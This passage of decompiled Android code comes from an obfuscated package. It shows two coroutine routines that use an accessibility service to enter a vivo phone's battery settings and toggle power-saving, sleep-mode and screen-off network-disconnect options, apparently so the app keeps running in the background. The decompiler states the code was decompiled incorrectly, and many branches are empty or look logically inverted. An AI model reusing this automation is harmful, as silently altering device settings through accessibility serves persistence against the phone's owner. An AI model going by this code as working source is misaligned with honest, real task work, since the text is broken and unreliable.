                        vivoSteps$executeBatteryMethodN$12.f54853a5 = 12;
                        objM212393b02 = c0371a8.m212393b0("省电管理#更多设置", 1, 3, vivoSteps$executeBatteryMethodN$12);
                        if (objM212393b02 != coroutineSingletons) {
                            if (!((Boolean) objM212393b02).booleanValue()) {
                                t60.m214704c5(c0371a8.f55141a2, "[电池-方法N] ❌ 未找到省电管理/更多设置");
                            }
                            vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
                            vivoSteps$executeBatteryMethodN$12.f54853a5 = 13;
                            if (b81.m210571b1(1000L, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                c0371a85 = c0371a8;
                                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                vivoSteps$executeBatteryMethodN$12.f54853a5 = 14;
                                if (c0371a85.m212430f8(1, "自动开启省电模式", vivoSteps$executeBatteryMethodN$12, z) != coroutineSingletons) {
                                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 15;
                                    if (b81.m210571b1(j3, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                        if (Build.VERSION.SDK_INT <= 33) {
                                            j = 500;
                                            vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                            vivoSteps$executeBatteryMethodN$12.f54853a5 = 18;
                                            if (c0371a85.m212430f8(1, "熄屏5分钟断开网络", vivoSteps$executeBatteryMethodN$12, z) != coroutineSingletons) {
                                                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                                vivoSteps$executeBatteryMethodN$12.f54853a5 = 19;
                                                if (b81.m210571b1(j, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 20;
                                                    if (c0371a85.m212430f8(1, "睡眠待机优化", vivoSteps$executeBatteryMethodN$12, z) != coroutineSingletons) {
                                                        vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                                        vivoSteps$executeBatteryMethodN$12.f54853a5 = 21;
                                                        break;
                                                    }
                                                }
                                            }
                                        } else {
                                            vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                            vivoSteps$executeBatteryMethodN$12.f54853a5 = 16;
                                            if (c0371a85.m212430f8(1, "睡眠模式", vivoSteps$executeBatteryMethodN$12, z) != coroutineSingletons) {
                                                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                                                vivoSteps$executeBatteryMethodN$12.f54853a5 = 17;
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        t60.m214704c5(c0371a8.f55141a2, "[电池-方法N] ❌ 重试3次后仍未成功进入电池页面");
                        return Boolean.FALSE;
                    }
                } else {
                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
                    vivoSteps$executeBatteryMethodN$12.f54849a1 = i;
                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 4;
                    objM212419e7 = c0371a8.m212419e7(10, vivoSteps$executeBatteryMethodN$12);
                    break;
                }
                return coroutineSingletons;
            case 1:
                i = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a8 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                if (((Boolean) objM212393b03).booleanValue()) {
                }
                z = false;
                if (i != 0) {
                }
                return coroutineSingletons;
            case 2:
                i = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a8 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                if (!c0371a8.m212417e5()) {
                }
                break;
            case 3:
                c0371a82 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                c0371a8 = c0371a82;
                i = 1;
                if (i != 0) {
                }
                return coroutineSingletons;
            case 4:
                i = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a8 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                objM212419e7 = objM212393b03;
                z = false;
                if (!((Boolean) objM212419e7).booleanValue()) {
                    return Boolean.FALSE;
                }
                i2 = 1;
                if (i2 < i6) {
                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
                    vivoSteps$executeBatteryMethodN$12.f54849a1 = i;
                    vivoSteps$executeBatteryMethodN$12.f54850a2 = i2;
                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 5;
                    objM212393b0 = c0371a8.m212393b0("电池", Buffer.SEGMENTING_THRESHOLD, 3, vivoSteps$executeBatteryMethodN$12);
                    if (objM212393b0 != coroutineSingletons) {
                        C0371a8 c0371a87 = c0371a8;
                        i4 = i;
                        i3 = i2;
                        c0371a83 = c0371a87;
                        if (!((Boolean) objM212393b0).booleanValue()) {
                            vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                            vivoSteps$executeBatteryMethodN$12.f54849a1 = i4;
                            vivoSteps$executeBatteryMethodN$12.f54850a2 = i3;
                            vivoSteps$executeBatteryMethodN$12.f54853a5 = 6;
                            if (b81.m210571b1(j2, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                if (c0371a83.m212417e5()) {
                                    t60.m214726f4(c0371a83.f55141a2, "[电池-方法N] ⚠️ 点击了电池但未进入电池页面，重试...");
                                    c0371a83.f55139a0.performGlobalAction(1);
                                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                                    vivoSteps$executeBatteryMethodN$12.f54849a1 = i4;
                                    vivoSteps$executeBatteryMethodN$12.f54850a2 = i3;
                                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 8;
                                    break;
                                } else {
                                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 7;
                                    if (c0371a83.m212437g5(3, 50L, 1500L, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                        c0371a84 = c0371a83;
                                        c0371a8 = c0371a84;
                                        i = 1;
                                        j3 = 300;
                                        if (i != 0) {
                                        }
                                    }
                                }
                            }
                        } else {
                            j3 = 300;
                            t60.m214726f4(c0371a83.f55141a2, "[电池-方法N] ⚠️ 未找到电池入口，重试... (" + i3 + "/3)");
                            if (i3 < 3) {
                                c0371a83.f55139a0.performGlobalAction(1);
                                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                                vivoSteps$executeBatteryMethodN$12.f54849a1 = i4;
                                vivoSteps$executeBatteryMethodN$12.f54850a2 = i3;
                                vivoSteps$executeBatteryMethodN$12.f54853a5 = 9;
                                if (b81.m210571b1(300L, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                                    vivoSteps$executeBatteryMethodN$12.f54849a1 = i4;
                                    vivoSteps$executeBatteryMethodN$12.f54850a2 = i3;
                                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 10;
                                    objM212419e72 = c0371a83.m212419e7(10, vivoSteps$executeBatteryMethodN$12);
                                    if (objM212419e72 != coroutineSingletons) {
                                        if (!((Boolean) objM212419e72).booleanValue()) {
                                            vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                                            vivoSteps$executeBatteryMethodN$12.f54849a1 = i4;
                                            vivoSteps$executeBatteryMethodN$12.f54850a2 = i3;
                                            vivoSteps$executeBatteryMethodN$12.f54853a5 = 11;
                                            break;
                                        } else {
                                            t60.m214704c5(c0371a83.f55141a2, "[电池-方法N] ❌ 重新打开设置失败");
                                            return Boolean.FALSE;
                                        }
                                    }
                                }
                            }
                            C0371a8 c0371a88 = c0371a83;
                            i2 = i3 + 1;
                            i = i4;
                            c0371a8 = c0371a88;
                            i6 = 4;
                            j2 = 800;
                            if (i2 < i6) {
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 5:
                i3 = vivoSteps$executeBatteryMethodN$12.f54850a2;
                i4 = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a83 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                objM212393b0 = objM212393b03;
                z = false;
                if (!((Boolean) objM212393b0).booleanValue()) {
                }
                return coroutineSingletons;
            case 6:
                i3 = vivoSteps$executeBatteryMethodN$12.f54850a2;
                i4 = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a83 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                if (c0371a83.m212417e5()) {
                }
                return coroutineSingletons;
            case 7:
                c0371a84 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                c0371a8 = c0371a84;
                i = 1;
                j3 = 300;
                if (i != 0) {
                }
                break;
            case 8:
            case oe0.DEFAULT_M /* 11 */:
                i3 = vivoSteps$executeBatteryMethodN$12.f54850a2;
                i4 = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a83 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                C0371a8 c0371a882 = c0371a83;
                i2 = i3 + 1;
                i = i4;
                c0371a8 = c0371a882;
                i6 = 4;
                j2 = 800;
                if (i2 < i6) {
                }
                return coroutineSingletons;
            case 9:
                i3 = vivoSteps$executeBatteryMethodN$12.f54850a2;
                i4 = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a83 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a83;
                vivoSteps$executeBatteryMethodN$12.f54849a1 = i4;
                vivoSteps$executeBatteryMethodN$12.f54850a2 = i3;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 10;
                objM212419e72 = c0371a83.m212419e7(10, vivoSteps$executeBatteryMethodN$12);
                if (objM212419e72 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                i3 = vivoSteps$executeBatteryMethodN$12.f54850a2;
                i4 = vivoSteps$executeBatteryMethodN$12.f54849a1;
                c0371a83 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                objM212419e72 = objM212393b03;
                z = false;
                if (!((Boolean) objM212419e72).booleanValue()) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                C0371a8 c0371a89 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                c0371a8 = c0371a89;
                objM212393b02 = objM212393b03;
                z = false;
                if (!((Boolean) objM212393b02).booleanValue()) {
                }
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 13;
                if (b81.m210571b1(1000L, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 14;
                if (c0371a85.m212430f8(1, "自动开启省电模式", vivoSteps$executeBatteryMethodN$12, z) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 15;
                if (b81.m210571b1(j3, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                if (Build.VERSION.SDK_INT <= 33) {
                }
                return coroutineSingletons;
            case 16:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 17;
                break;
            case 17:
            case 21:
                C0371a8 c0371a810 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                c0371a810.f55142a3.m214998b3("vivo_battery_saving_done");
                return Boolean.TRUE;
            case 18:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                j = 500;
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 19;
                if (b81.m210571b1(j, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                z = false;
                j = 500;
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 20;
                if (c0371a85.m212430f8(1, "睡眠待机优化", vivoSteps$executeBatteryMethodN$12, z) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 20:
                c0371a85 = vivoSteps$executeBatteryMethodN$12.f54848a0;
                kg1.m213544f4(objM212393b03);
                j = 500;
                vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a85;
                vivoSteps$executeBatteryMethodN$12.f54853a5 = 21;
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:52:0x0147, code lost:
    
        if (r4 == r2) goto L112;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x01c5, code lost:
    
        if (p000.b81.m210571b1(300, r9) == r2) goto L112;
     */
    /* JADX WARN: Code restructure failed: missing block: B:93:0x0230, code lost:
    
        if (p000.b81.m210571b1(r4, r9) == r2) goto L112;
     */
    /* JADX WARN: Removed duplicated region for block: B:100:0x0249  */
    /* JADX WARN: Removed duplicated region for block: B:107:0x026a A[PHI: r3
      0x026a: PHI (r3v42 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v40 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v43 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:105:0x0267, B:15:0x0049] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:110:0x027b A[PHI: r3
      0x027b: PHI (r3v44 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v42 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v45 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:108:0x0278, B:14:0x0042] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:113:0x028a  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x0102  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0117  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x013d  */
    /* JADX WARN: Removed duplicated region for block: B:60:0x015a  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0175  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x018c  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x01a8  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x01cc  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x0210 A[PHI: r1 r3 r4 r6 r7 r11 r12
      0x0210: PHI (r1v24 java.lang.Object) = (r1v1 java.lang.Object), (r1v31 java.lang.Object) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]
      0x0210: PHI (r3v24 int) = (r3v23 int), (r3v25 int) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]
      0x0210: PHI (r4v11 long) = (r4v10 long), (r4v12 long) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]
      0x0210: PHI (r6v18 int) = (r6v17 int), (r6v19 int) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]
      0x0210: PHI (r7v6 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v5 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v7 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]
      0x0210: PHI (r11v15 java.lang.String) = (r11v14 java.lang.String), (r11v16 java.lang.String) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]
      0x0210: PHI (r12v12 int) = (r12v11 int), (r12v13 int) binds: [B:18:0x0061, B:86:0x020c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0018  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0218  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0222  */
    /* JADX WARN: Removed duplicated region for block: B:96:0x023c  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x023d A[PHI: r3 r6
      0x023d: PHI (r3v26 int) = (r3v11 int), (r3v30 int), (r3v35 int) binds: [B:50:0x013b, B:75:0x01a4, B:96:0x023c] A[DONT_GENERATE, DONT_INLINE]
      0x023d: PHI (r6v20 com.storm.safe.rock.service.modules.yw5xud.a8) = 
      (r6v9 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r6v21 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r6v24 com.storm.safe.rock.service.modules.yw5xud.a8)
     binds: [B:50:0x013b, B:75:0x01a4, B:96:0x023c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x023f  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:77:0x01c5 -> B:79:0x01c9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:81:0x01e6 -> B:79:0x01c9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:93:0x0230 -> B:79:0x01c9). Please report as a decompilation issue!!! */
    /* renamed from: b8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212400b8(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeBatteryMethodO$1 vivoSteps$executeBatteryMethodO$1;
        C0371a8 c0371a8;
        int i;
        int i2;
        String str;
        int i3;
        C0371a8 c0371a82;
        Object objM212419e7;
        int i4;
        int i5;
        int i6;
        C0371a8 c0371a83;
        Object objM212393b0;
        C0371a8 c0371a84;
        long j;
        C0371a8 c0371a85;
        C0371a8 c0371a86;
        if (continuationImpl instanceof VivoSteps$executeBatteryMethodO$1) {
            vivoSteps$executeBatteryMethodO$1 = (VivoSteps$executeBatteryMethodO$1) continuationImpl;
            int i7 = vivoSteps$executeBatteryMethodO$1.f54859a5;
            if ((i7 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeBatteryMethodO$1.f54859a5 = i7 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeBatteryMethodO$1 = new VivoSteps$executeBatteryMethodO$1(this, continuationImpl);
            }
        }
        VivoSteps$executeBatteryMethodO$1 vivoSteps$executeBatteryMethodO$12 = vivoSteps$executeBatteryMethodO$1;
        Object objM212393b02 = vivoSteps$executeBatteryMethodO$12.f54857a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i8 = 4;
        switch (vivoSteps$executeBatteryMethodO$12.f54859a5) {
            case 0:
                kg1.m213544f4(objM212393b02);
                if (!m212417e5()) {
                    vivoSteps$executeBatteryMethodO$12.f54854a0 = this;
                    vivoSteps$executeBatteryMethodO$12.f54855a1 = 0;
                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 1;
                    objM212393b02 = m212393b0("电池", Buffer.SEGMENTING_THRESHOLD, 3, vivoSteps$executeBatteryMethodO$12);
                    if (objM212393b02 != coroutineSingletons) {
                        c0371a8 = this;
                        i = 0;
                        if (((Boolean) objM212393b02).booleanValue()) {
                            vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a8;
                            vivoSteps$executeBatteryMethodO$12.f54855a1 = i;
                            vivoSteps$executeBatteryMethodO$12.f54859a5 = 2;
                            if (b81.m210571b1(800L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                                if (c0371a8.m212417e5()) {
                                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a8;
                                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 3;
                                    C0371a8 c0371a87 = c0371a8;
                                    str = "电池";
                                    i3 = 3;
                                    i2 = 4096;
                                    if (c0371a87.m212437g5(3, 50L, 1500L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                                        c0371a82 = c0371a87;
                                        c0371a8 = c0371a82;
                                        i = 1;
                                        if (i != 0) {
                                        }
                                    }
                                }
                            }
                        }
                        i2 = 4096;
                        str = "电池";
                        i3 = 3;
                        if (i != 0) {
                        }
                    }
                    return coroutineSingletons;
                }
                c0371a8 = this;
                i2 = 4096;
                str = "电池";
                i = 1;
                i3 = 3;
                if (i != 0) {
                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a8;
                    vivoSteps$executeBatteryMethodO$12.f54855a1 = i;
                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 4;
                    objM212419e7 = c0371a8.m212419e7(10, vivoSteps$executeBatteryMethodO$12);
                    break;
                } else {
                    if (i != 0) {
                        t60.m214704c5(c0371a8.f55141a2, "[电池-方法O] ❌ 重试后仍未成功进入电池页面");
                        return Boolean.FALSE;
                    }
                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a8;
                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 12;
                    if (c0371a8.m212430f8(1, "省电模式", vivoSteps$executeBatteryMethodO$12, false) != coroutineSingletons) {
                        c0371a85 = c0371a8;
                        vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a85;
                        vivoSteps$executeBatteryMethodO$12.f54859a5 = 13;
                        if (b81.m210571b1(500L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                            vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a85;
                            vivoSteps$executeBatteryMethodO$12.f54859a5 = 14;
                            if (c0371a85.m212430f8(1, "睡眠模式", vivoSteps$executeBatteryMethodO$12, false) != coroutineSingletons) {
                                vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a85;
                                vivoSteps$executeBatteryMethodO$12.f54859a5 = 15;
                                if (b81.m210571b1(500L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                                    c0371a86 = c0371a85;
                                    c0371a86.f55142a3.m214998b3("vivo_battery_saving_done");
                                    return Boolean.TRUE;
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                i = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a8 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                if (((Boolean) objM212393b02).booleanValue()) {
                }
                i2 = 4096;
                str = "电池";
                i3 = 3;
                if (i != 0) {
                }
                return coroutineSingletons;
            case 2:
                i = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a8 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                if (c0371a8.m212417e5()) {
                }
                i2 = 4096;
                str = "电池";
                i3 = 3;
                if (i != 0) {
                }
                return coroutineSingletons;
            case 3:
                c0371a82 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                i2 = 4096;
                str = "电池";
                i3 = 3;
                c0371a8 = c0371a82;
                i = 1;
                if (i != 0) {
                }
                return coroutineSingletons;
            case 4:
                i = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a8 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                objM212419e7 = objM212393b02;
                i2 = 4096;
                str = "电池";
                i3 = 3;
                if (!((Boolean) objM212419e7).booleanValue()) {
                    return Boolean.FALSE;
                }
                i4 = i;
                i5 = 1;
                if (i5 >= i8) {
                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a8;
                    vivoSteps$executeBatteryMethodO$12.f54855a1 = i4;
                    vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 5;
                    objM212393b0 = c0371a8.m212393b0(str, i2, i3, vivoSteps$executeBatteryMethodO$12);
                    if (objM212393b0 != coroutineSingletons) {
                        c0371a83 = c0371a8;
                        i6 = i4;
                        if (!((Boolean) objM212393b0).booleanValue()) {
                            vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
                            vivoSteps$executeBatteryMethodO$12.f54855a1 = i6;
                            vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                            vivoSteps$executeBatteryMethodO$12.f54859a5 = 6;
                            if (b81.m210571b1(800L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                                if (c0371a83.m212417e5()) {
                                    t60.m214726f4(c0371a83.f55141a2, "[电池-方法O] ⚠️ 点击了电池但未进入，重试...");
                                    c0371a83.f55139a0.performGlobalAction(1);
                                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
                                    vivoSteps$executeBatteryMethodO$12.f54855a1 = i6;
                                    vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 8;
                                    break;
                                } else {
                                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
                                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 7;
                                    if (c0371a83.m212437g5(3, 50L, 1500L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                                        c0371a84 = c0371a83;
                                        c0371a8 = c0371a84;
                                        i = 1;
                                        if (i != 0) {
                                        }
                                    }
                                }
                            }
                        } else {
                            j = 300;
                            t60.m214726f4(c0371a83.f55141a2, "[电池-方法O] ⚠️ 未找到电池入口，重试... (" + i5 + "/3)");
                            if (i5 < i3) {
                                c0371a83.f55139a0.performGlobalAction(1);
                                vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
                                vivoSteps$executeBatteryMethodO$12.f54855a1 = i6;
                                vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                                vivoSteps$executeBatteryMethodO$12.f54859a5 = 9;
                                if (b81.m210571b1(300L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                                    vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
                                    vivoSteps$executeBatteryMethodO$12.f54855a1 = i6;
                                    vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                                    vivoSteps$executeBatteryMethodO$12.f54859a5 = 10;
                                    objM212393b02 = c0371a83.m212419e7(10, vivoSteps$executeBatteryMethodO$12);
                                    if (objM212393b02 != coroutineSingletons) {
                                        if (!((Boolean) objM212393b02).booleanValue()) {
                                            vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
                                            vivoSteps$executeBatteryMethodO$12.f54855a1 = i6;
                                            vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                                            vivoSteps$executeBatteryMethodO$12.f54859a5 = 11;
                                            break;
                                        } else {
                                            t60.m214704c5(c0371a83.f55141a2, "[电池-方法O] ❌ 重新打开设置失败");
                                            return Boolean.FALSE;
                                        }
                                    }
                                }
                            }
                            i5++;
                            i4 = i6;
                            c0371a8 = c0371a83;
                            i2 = Buffer.SEGMENTING_THRESHOLD;
                            i8 = 4;
                            if (i5 >= i8) {
                                i = i4;
                                if (i != 0) {
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                break;
            case 5:
                i5 = vivoSteps$executeBatteryMethodO$12.f54856a2;
                i6 = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a83 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                str = "电池";
                i3 = 3;
                objM212393b0 = objM212393b02;
                if (!((Boolean) objM212393b0).booleanValue()) {
                }
                return coroutineSingletons;
            case 6:
                i5 = vivoSteps$executeBatteryMethodO$12.f54856a2;
                i6 = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a83 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                str = "电池";
                i3 = 3;
                if (c0371a83.m212417e5()) {
                }
                return coroutineSingletons;
            case 7:
                c0371a84 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                c0371a8 = c0371a84;
                i = 1;
                if (i != 0) {
                }
                break;
            case 8:
                i5 = vivoSteps$executeBatteryMethodO$12.f54856a2;
                i6 = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a83 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                str = "电池";
                i3 = 3;
                i5++;
                i4 = i6;
                c0371a8 = c0371a83;
                i2 = Buffer.SEGMENTING_THRESHOLD;
                i8 = 4;
                if (i5 >= i8) {
                }
                break;
            case 9:
                i5 = vivoSteps$executeBatteryMethodO$12.f54856a2;
                i6 = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a83 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                str = "电池";
                i3 = 3;
                j = 300;
                vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a83;
